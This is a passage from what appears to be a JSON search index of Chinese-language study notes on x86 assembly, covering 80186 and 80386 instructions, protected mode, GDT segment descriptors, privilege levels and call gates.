cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a insw 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsw / rep insw \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in ax, dx; mov es:[di], ax \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsb 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsb / rep outsb \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov al, ds:[si]; out al, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsw 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsw / rep outsw \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov ax, ds:[si]; out ax, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a pusha 80186 \u6307\u4ee4\u683c\u5f0f \uff1apusha \u6307\u4ee4\u4f5c\u7528 \uff1apush \u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a ax cx dx bx sp bp si di popa 80186 \u6307\u4ee4\u683c\u5f0f \uff1apopa \u6307\u4ee4\u4f5c\u7528 \uff1apop \u5230\u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a di si bp sp bx dx cx ax \u7acb\u5373\u6570\u8bed\u6cd5\u6269\u5c55 80186 push \u53ef\u4ee5\u76f4\u63a5\u63a5\u7acb\u5373\u6570 imul shl shr sal sar rol ror rcl rcr \u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570","title":"80186"},{"location":"cs/pl/asm/#80286","text":"80286 \u589e\u52a0\u4e86\u4fdd\u62a4\u6a21\u5f0f\u53ca\u76f8\u5173\u6307\u4ee4\uff0c\u4e0d\u5199\u5728\u8fd9\u91cc\u4e86","title":"80286"},{"location":"cs/pl/asm/#80386","text":"80386\uff08\u5373 i386\uff09\u5347\u7ea7\u5230\u4e86 32 \u4f4d\u67b6\u6784\uff0c\u5bc4\u5b58\u5668\u5747\u53d8\u4e3a 32 \u4f4d\uff08\u4ee5 e \u5f00\u5934\uff09\uff0c\u589e\u52a0\u4e86 fs gs \u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\u3002\u4e00\u4e9b\u6307\u4ee4\u4ece 8086 \u81ea\u7136\u6269\u5c55\u652f\u6301 32 \u4f4d\uff0c\u4e0d\u5728\u6b64\u8d58\u8ff0","title":"80386"},{"location":"cs/pl/asm/#bit","text":"bt 80386 \u6307\u4ee4\u683c\u5f0f \uff1abt src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bts 80386 \u6307\u4ee4\u683c\u5f0f \uff1abts src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and set) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 1 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btr 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtr src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and reset) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u8bbe\u4e3a 0 \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF btc 80386 \u6307\u4ee4\u683c\u5f0f \uff1abtc src, pos \u6307\u4ee4\u4f5c\u7528 \uff1a(bit test and complement) \u5c06 src \u7684\u7b2c pos \u4f4d\u62f7\u8d1d\u5230 cf \u4e2d\u540e\u5c06\u5176\u53cd\u8f6c \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cpos \u662f\u5bc4\u5b58\u5668\u6216\u7acb\u5373\u6570\uff08\u4ece\u53f3\u5411\u5de6\u4ece\u96f6\u5f00\u59cb\u6570\uff09 OF DF IF TF SF ZF AF PF CF bsf 80386 \u6307\u4ee4\u683c\u5f0f \uff1absf dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan forward) \u5728 src \u4e2d\u641c\u7d22\u6700\u4f4e\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF bsr 80386 \u6307\u4ee4\u683c\u5f0f \uff1absr dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(bit scan reverse) \u5728 src \u4e2d\u641c\u7d22\u6700\u9ad8\u4f4d\u7684 1 \u5bf9\u5e94\u7d22\u5f15\u5b58\u653e\u5728 dest \u4e2d \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u5982\u679c src \u662f 0 \u5219 dest \u4e0d\u53d8\uff0czf \u7f6e\u4e3a 1 \u5426\u5219\u4e3a 0 OF DF IF TF SF ZF AF PF CF","title":"bit \u76f8\u5173\u6307\u4ee4"},{"location":"cs/pl/asm/#_54","text":"movsx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with sign-extension) \u5c06 src \u7b26\u53f7\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 movzx 80386 \u6307\u4ee4\u683c\u5f0f \uff1amovsx dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a(move with zero-extension) \u5c06 src \u96f6\u6269\u5c55\u5230 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\u3002\u53ef\u4ee5 8 -> 16\u30018 -> 32\u300116 -> 32 pushad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushad \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\u538b\u5165\u5806\u6808\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a eax ecx edx ebx esp ebp esi edi \u6ce8\u610f \uff1apusha \u4ecd\u4e3a\u538b\u5165 16 \u4f4d\u5bc4\u5b58\u5668 popad 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopad \u6307\u4ee4\u4f5c\u7528 \uff1apop \u51fa 32 \u4f4d\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a edi esi ebp esp ebx edx ecx eax \u6ce8\u610f \uff1apopa \u4ecd\u4e3a\u5f39\u51fa 16 \u4f4d\u5bc4\u5b58\u5668 pushfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apushfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eflags \u538b\u5165\u5806\u6808 \u6ce8\u610f \uff1apushf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 popfd 80386 \u6307\u4ee4\u683c\u5f0f \uff1apopfd \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa\u5230 eflags \u6ce8\u610f \uff1apopf \u4ecd\u4e3a 16 \u4f4d\uff08\u5373 eflags \u7684\u4f4e 16 \u4f4d\uff09 OF DF IF TF SF ZF AF PF CF lss 80386 \u6307\u4ee4\u683c\u5f0f \uff1alss dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ss:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lfs 80386 \u6307\u4ee4\u683c\u5f0f \uff1alfs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 fs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32 lgs 80386 \u6307\u4ee4\u683c\u5f0f \uff1algs dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 gs:dest \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f m16:16 \u6216 m16:32","title":"\u6570\u636e\u8f6c\u79fb\u6307\u4ee4"},{"location":"cs/pl/asm/#_55","text":"cdq 80386 \u6307\u4ee4\u683c\u5f0f \uff1acdq \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 eax \u6269\u5145\u4e3a edx:eax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 eax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 edx cwde 80386 \u6307\u4ee4\u683c\u5f0f \uff1acwde \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ax \u7b26\u53f7\u6269\u5145\u4e3a eax \u6ce8\u610f \uff1acwd \u4ecd\u4e3a\u5c06 ax \u6269\u5145\u5230 dx:ax","title":"\u8f6c\u6362\u6307\u4ee4"},{"location":"cs/pl/asm/#_56","text":"imul \u8bed\u6cd5\u6269\u5c55 80386 \u6307\u4ee4\u683c\u5f0f \uff1aimul dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08\u652f\u6301\u4f20\u5165\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09dest = dest * src\uff0c\u622a\u53d6\u7ed3\u679c\u7684\u4f4e\u4f4d\u5b58\u5165 dest \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\uff0csrc \u4e3a\u5bc4\u5b58\u5668\u6216\u5b58\u50a8\u5355\u5143\u3002\u7ed3\u679c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\u4e58\u6cd5\u548c\u65e0\u7b26\u53f7\u6570\u4e58\u6cd5\u76f8\u540c shld 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashld r1, r2, imm / shld r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1< >(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF shrd 80386 \u6307\u4ee4\u683c\u5f0f \uff1ashrd r1, r2, imm / shrd r1, r2, cl \u6307\u4ee4\u4f5c\u7528 \uff1ar1 = r1>>cl \u2223 r2<<(register_width - cl) \u6ce8\u610f \uff1ar1 \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143\uff0cr2 \u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e09\u4e2a\u64cd\u4f5c\u6570\u662f cl \u6216 8 \u4f4d\u7acb\u5373\u6570\u3002cf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5982\u679c\u79fb\u4f4d\u4e3a 1 \u4e14\u7b26\u53f7\u4f4d\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u5219 of \u4e3a 1 \u53cd\u4e4b\u4e3a 0\uff0c\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1\uff0c\u5219 of undefined OF DF IF TF SF ZF AF PF CF set cc \u7c7b\u6307\u4ee4 80386 \u6307\u4ee4\u683c\u5f0f \uff1aset cc dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c cc \u6ee1\u8db3\uff0c\u5219\u5c06\u5b57\u8282 dest \u8bbe\u4e3a 1\uff0c\u5426\u5219\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a cc \u540c j cc \uff0cdest \u4e3a 8 \u4f4d\u5bc4\u5b58\u5668\u6216\u5b57\u8282\u5927\u5c0f\u5b58\u50a8\u5355\u5143","title":"\u8fd0\u7b97\u6307\u4ee4"},{"location":"cs/pl/asm/#_57","text":"\u9488\u5bf9 32 \u4f4d\u65b0\u589e CMPSD LODSD SCASD STOSD MOVSD INSD OUTSD \u4e03\u4e2a\u5b57\u7b26\u4e32\u76f8\u5173\u6307\u4ee4\uff0c\u610f\u4e49\u5747\u548c 8086 / 80186 \u7c7b\u4f3c\uff0c\u4e0d\u518d\u8d58\u8ff0","title":"\u5b57\u7b26\u4e32\u7c7b\u6307\u4ee4"},{"location":"cs/pl/asm/#_58","text":"\u9488\u5bf9 32 \u4f4d\u65b0\u589e IRETD \u6307\u4ee4\uff08\u4e0e IRET \u76f8\u540c\uff0c\u673a\u5668\u7801\u4e5f\u76f8\u540c\uff09\uff0cJECXZ \u6307\u4ee4\uff08jump if ecx equal zero\uff09\u4e0d\u518d\u8d58\u8ff0","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4"},{"location":"cs/pl/asm/#80386_1","text":"","title":"80386 \u4fdd\u62a4\u6a21\u5f0f\u539f\u7406"},{"location":"cs/pl/asm/#_59","text":"\u5b9e\u6a21\u5f0f\uff08real mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5747\u4e3a 16 \u4f4d \u6bb5\u5730\u5740*10h + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 10000h \u5b57\u8282 \u6bcf\u4e2a\u6bb5\u540c\u65f6\u5177\u6709 Read Write eXecute \u5c5e\u6027 \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6ca1\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u90fd\u662f ring0\uff08\u6700\u9ad8\u6743\u9650\uff09 \u4fdd\u62a4\u6a21\u5f0f\uff08protected mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u662f 16\u4f4d:16\u4f4d \u4e5f\u53ef\u4ee5\u662f 16\u4f4d:32\u4f4d gdt[\u6bb5\u5730\u5740].base_addr + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 4G \u5b57\u8282 \u6570\u636e\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u8bfb\u3001\u8bfb\u5199 \u4ee3\u7801\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u6267\u884c\u4e0d\u53ef\u8bfb\u3001\u53ef\u6267\u884c\u53ef\u8bfb \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a ring0\uff0c\u7528\u6237\u4ee3\u7801\u4e3a ring3 \u963b\u6b62 ring3 \u7684\u4ee3\u7801\u8bbf\u95ee ring0 \u7684\u6570\u636e\uff1a mov ax , \u6bb5\u5730\u5740 mov ds , ax ; \u8fd9\u4e00\u6b65\u4f1a\u88ab\u9650\u5236 mov ebx , \u504f\u79fb\u5730\u5740 mov al , ds :[ ebx ] \u5f53\u6bb5\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u7684\u65f6\u5019\uff0cCPU \u4f1a\u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u628a\u5f53\u524d cs \u7684\u4f4e 2 \u4f4d\u548c\u6bb5\u5730\u5740\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u6240\u5305\u542b\u7684 DPL \u8fdb\u884c\u6bd4\u8f83\u5982\u679c \u201ccs.cpl <= \u6bb5\u5730\u5740->\u63cf\u8ff0\u7b26.DPL\u201d \u5219\u5141\u8bb8\u8bbf\u95ee\uff0c\u5426\u5219\u4ea7\u751f General Protection Fault CPL\uff08current privilege level\uff09\u5373 cs \u7684\u4f4e 2 \u4f4d\uff0c\u8868\u793a\u5f53\u524d\u7a0b\u5e8f\u7684\u6743\u9650\uff0cDPL\uff08descriptor privilege level\uff09\u8868\u793a\u6bb5\u5730\u5740\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684\u6743\u9650\u3002\u610f\u4e49\u5373\u662f ring?\uff0c\u6570\u5b57\u8d8a\u5c0f\u6743\u9650\u8d8a\u5927","title":"\u5b9e\u6a21\u5f0f\u4e0e\u4fdd\u62a4\u6a21\u5f0f\u7684\u533a\u522b"},{"location":"cs/pl/asm/#_60","text":"gdt\uff08global descriptor table\uff09\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\uff0c\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5747\u4e3a 8 \u5b57\u8282\u3002 \u7a0b\u5e8f\u4e2d\u7684\u6bb5\u5730\u5740\u5b9e\u9645\u4e0a\u53eb selector\uff0cselector \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e3a gdt+(selector&0FFF8h) \u5904\u7684 8 \u5b57\u8282\uff08\u5373\u4e22\u6389 selector \u7684\u4f4e 3 \u4f4d\uff09 gdt+00h gdt+08h +---+---+-base_addr--+ | | | | -- -- -- -- gdt+10h FF, FF, 00, 80, 0B, F3, 0F, 00 ; \u6574\u4f53 8 \u5b57\u8282\u662f\u6bb5\u5730\u5740 10h \u7684\u63cf\u8ff0\u7b26\uff08descriptor\uff09 ~~ ~~ == ^~ +---+---------------|---|+ | | +-- Granularity = bit 7 | +-- DPL = bit 6, 5 = 11 +-- limit || || 1111 0011 <- 0F |--| | || | | | |+-- Accessed | | | +-- bit 1 | | +-- bit 3 | +-- S +-- Present = bit 7 gdt+18h \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u7b2c 6\u30015 \u4e2a bit \u4e3a DPL \u4f8b\u4e0a\u9762 10h \u6bb5\u7684 DPL \u4e3a 11b \u5373 3\uff08F3 -> 1 11 1 0011\uff09 \u7b2c 2\u30013\u30014\u30017 \u4e2a\u5b57\u8282\u4e3a\u6bb5\u8d77\u59cb\u5730\u5740 base_addr\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6bb5\u8d77\u59cb\u5730\u5740\u4e3a 000B8000h \u7b2c 0\u30011 \u4e2a\u5b57\u8282\u548c\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u540e\u534a\u4e2a\u5b57\u8282\u4e3a\u6700\u5927\u504f\u79fb\u5730\u5740 limit\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6700\u5927\u504f\u79fb\u5730\u5740\u4e3a 0FFFFFh\uff0c\u6700\u5c0f\u504f\u79fb\u5730\u5740\u4e3a 0\uff0c\u6240\u4ee5\u6bb5\u957f\u5ea6\u4e3a 100000h \u5373 1M \u7b2c 6 \u4e2a\u5b57\u8282\u7684\u7b2c 7 \u4e2a bit \u4e3a\u7c92\u5ea6 Granularity\uff0c\u5f53\u8be5\u4f4d\u4e3a 1 \u65f6\uff0climit \u7684\u5355\u4f4d\u53d8\u6210 page\uff08\u9875\uff0c\u4e00\u9875\u4e3a 4k=1000h \u5b57\u8282\uff09 \u4f8b\u5982\u5982\u679c limit \u4e3a FFFFF\uff0cG \u4e3a 1\uff0c\u5219\u6700\u5927\u504f\u79fb\u5730\u5740\u53d8\u4e3a FFFFFFFF\uff08\u6700\u540e\u4e00\u9875\u7684\u5730\u5740\u4e3a [FFFFF000, FFFFFFFF]\uff09 \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u5176\u5b83 bit \u7b2c 7 bit \u4e3a Present\uff0c\u8868\u793a\u8be5\u6bb5\u662f\u5426\u5b58\u5728 \u7b2c 4 bit \u4e3a S\uff0cS = 1 \u8868\u793a\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\uff0c0 \u5219\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\uff08\u5305\u62ec\u4e0b\u9762\u7684 call gate\uff09 \u7b2c 3 bit \u4e3a 0 \u8868\u793a\u662f\u6570\u636e\u6bb5\uff0c1 \u8868\u793a\u662f\u4ee3\u7801\u6bb5 \u7b2c 1 bit\uff0c\u5982\u679c\u662f\u6570\u636e\u6bb5\uff0c\u5219 1 \u8868\u793a\u53ef\u5199\uff0c\u4ee3\u7801\u6bb5\u65f6 1 \u8868\u793a\u53ef\u8bfb \u7b2c 0 bit \u4e3a Accessed \u8868\u793a\u63cf\u8ff0\u7b26\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7 \u6bb5\u5730\u5740\uff08\u5176\u5b9e\u53eb selector\uff0910h \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u7684 DPL \u4e3a 11\uff0c\u5373\u6743\u9650\u4e3a ring3\uff08DPL \u4e3a 3\uff08\u6700\u4f4e\uff09\u7684\u65f6\u5019\u6240\u6709\u7a0b\u5e8f\u90fd\u662f\u6709\u6743\u8bbf\u95ee\u7684\uff09 \u5047\u8bbe\u524d\u9762\u90a3\u6bb5\u4ee3\u7801\u4e2d\u8d4b\u503c\u7ed9 ax \u7684\u6bb5\u5730\u5740\u4e3a 10h\uff0ccs \u4e3a 08h\uff080000 10 00 \uff09\uff0c\u5219 cs.cpl = 00\uff0c\u4e8e\u662f cs.cpl < 10h->descriptor.DPL\uff0c\u56e0\u6b64\u5f53\u524d\u7a0b\u5e8f\u6709\u6743\u628a ds \u8d4b\u503c\u4e3a 10h\uff0c\u5373\u6709\u6743\u8bbf\u95ee\u8be5\u6bb5\u4e2d\u7684\u6570\u636e \u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u5c0f\u4e8e\u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL\u3002\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u624d\u80fd jmp\u3001call \u5230\u8be5\u6bb5\u91cc\u9762\u7684\u51fd\u6570 \u5f53\u8bbf\u95ee\u8005\u7684 CPL \u5927\u4e8e\u67d0\u4e2a\u4ee3\u7801\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u65f6\uff0c\u5219\u53ea\u80fd\u7528 call call_gate_selector:0 \u8fd9\u6837\u7684\u65b9\u5f0f\u95f4\u63a5\u8c03\u7528\u8be5\u4ee3\u7801\u6bb5\u4e2d\u7684\u51fd\u6570","title":"\u6bb5\u63cf\u8ff0\u7b26"},{"location":"cs/pl/asm/#call-gate","text":"call gate \u5373\u8c03\u7528\u95e8\uff0c\u53ef\u4ee5\u770b\u4f5c\u4f4e\u6743\u9650\u8c03\u7528\u9ad8\u6743\u9650\u51fd\u6570\u7684\u8df3\u677f\u3002\u5b83\u672c\u8eab\u9700\u8981\u7528 8 \u4e2a\u5b57\u8282\u6765\u63cf\u8ff0\uff0c\u683c\u5f0f\u4f8b\u5982\uff1a +---+--------------------+---+-- \u76ee\u6807\u51fd\u6570\u504f\u79fb\u5730\u5740 | | | | -- -- -- -- gdt+20h 78, 56, 08, 00, 02, EC, 34, 12 == == ^^ ~~ | | | | +-------|----|--|---+---- \u5c5e\u6027 | | | +---- \u53c2\u6570\u7684\u4e2a\u6570 | +----+---- \u76ee\u6807\u51fd\u6570\u7684\u6bb5\u5730\u5740\uff08selector\uff09 | EC = 1110 1100 |==^ ---- || | | || | +-- type\uff0c0C \u5373\u8868\u793a\u662f 32 \u4f4d\u8c03\u7528\u95e8 || +-- S = 0\uff0c\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26 |+-- DPL +-- Present \u5f53 gdt \u91cc\u7684 S = 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u7cfb\u7edf\u63cf\u8ff0\u7b26\u800c\u4e0d\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\u7684\u63cf\u8ff0\u7b26\u3002\u7cfb\u7edf\u63cf\u8ff0\u7b26\u6709 tss\uff08task state segment\uff09\u63cf\u8ff0\u7b26\u3001task gate \u63cf\u8ff0\u7b26\u3001interrupt gate \u63cf\u8ff0\u7b26\u3001trap gate \u63cf\u8ff0\u7b26\u7b49\uff0cS = 0 \u4e14 type = 1100b \u65f6\u5373\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f 32 \u4f4d\u7684\u8c03\u7528\u95e8 \u5c5e\u6027\u4e2d\u7684 DPL \u662f call gate \u81ea\u5df1\u7684\u6743\u9650\u800c\u4e0d\u662f\u76ee\u6807\u51fd\u6570\u7684\u6743\u9650\uff0c\u76ee\u6807\u51fd\u6570\u7684 DPL \u8981\u901a\u8fc7\u7b2c 2\u30013 \u5b57\u8282\u7684 selector \u627e\u5230\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684 DPL \u8c03\u7528 call gate \u65f6\u7684\u6743\u9650\u6bd4\u8f83\uff1a \u8c03\u7528\u8005\u7684 CPL <= call_gate_selector->descripter.DPL \u8c03\u7528\u8005\u7684 CPL >= call_gate_selector->descriptor.target_selector->descriptor.DPL CPU \u4ece ROM \u542f\u52a8\u540e\u8fdb\u5165\u5b9e\u6a21\u5f0f\uff0c\u800c\u5b9e\u6a21\u5f0f\u7684\u6743\u9650\u90fd\u662f ring0\uff0c\u53ef\u4ee5\u5728\u5b9e\u6a21\u5f0f\u4e2d\u6267\u884c retf \u6765\u964d\u7ea7\u5230 ring3\u3002\u6784\u9020 jmp far ptr tss_selector:0 \u53ef\u4ee5\u4ece ring0 \u5f3a\u884c\u8df3\u56de ring3\uff08\u9700\u8981\u6784\u9020 tss \u4e0e\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\uff09 \u4ee5 memset(p, 0, n) \u4e3a\u4f8b\uff0cring0 \u51fd\u6570\u5982\u4f55\u9632\u6b62 ring3 \u4f20\u9012\u4e00\u4e2a\u6076\u610f\u7684\u6307\u9488\u5982 ring0 \u6307\u9488 p\u3002ring3 \u8fdb\u7a0b\u5047\u5982\u4e0d\u8c03\u7528 